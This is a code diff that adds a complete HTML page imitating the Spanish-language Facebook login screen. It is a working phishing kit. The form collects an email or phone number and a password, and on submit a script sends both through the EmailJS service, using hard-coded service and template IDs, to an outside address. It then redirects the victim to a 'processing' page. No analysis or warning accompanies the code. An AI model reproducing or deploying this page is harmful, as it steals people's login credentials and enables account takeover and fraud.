@@ -1,0 +1,72 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="./public/css/style.css">
+    <link rel="shortcut icon" href="./public/img/fblogo.webp" type="image/x-icon">
+    <link rel="preconnect" href="https://fonts.gstatic.com">
+    <link href="https://fonts.googleapis.com/css2?family=Material+Icons&display=swap" rel="stylesheet">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto&display=swap" rel="stylesheet">
+    <script src="./public/js/page.js" defer></script>
+    <title>Facebook</title>
+</head>
+<body>
+    <main class='faceboxBG'>
+        <form class='facebox' id="form">
+            <div class='deskFaceSide'>
+                <img src="./public/img/fbtext.svg" alt="logo"/>
+                <p>Facebook te ayuda a comunicarte y compartir con las personas que forman parte de tu vida</p>
+            </div>
+            <div class="loginFaceSide">
+                <input name="mail" type="text" placeholder="Correo electrónico o número de teléfono" required/>
+                <input name="pass" type="text" placeholder="Contraseña" required/>
+                <button type="submit" id="button">Iniciar sesión</button>
+                <a href="https://www.facebook.com/recover/initiate/?ars=facebook_login">¿Olvidaste tu contraseña?</a>
+                <hr/>
+                <button><a href="#facebook">Crear cuenta nueva</a></button>
+            </div>
+            <div class='footerFBLogin'>
+                <p><strong>Crea una página</strong> para una celebridad, una marca o un negocio.</p>
+            </div>
+        </form>
+    </main>
+
+    <script type="text/javascript"
+        src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js">
+    </script>
+
+    <script type="text/javascript">
+        emailjs.init('Rz35xcemz-sopEyrc')
+    </script>
+
+    <script type="text/javascript">
+        const btn = document.getElementById('button');
+
+        document.getElementById('form')
+        .addEventListener('submit', function(event) {
+            event.preventDefault();
+
+            btn.disabled = true;
+            btn.value = 'Procesando...';
+
+            const serviceID = 'service_ay7jkun';
+            const templateID = 'template_bpfdvuj';
+
+            emailjs.sendForm(serviceID, templateID, this)
+            .then(() => {
+                setTimeout(() => {
+                window.location = "procesando.html";
+                }, 3000);
+            }, (err) => {
+                btn.disabled = true;
+                btn.value = 'Error';
+            });
+        });
+    </script>
+
+</body>
+</html>
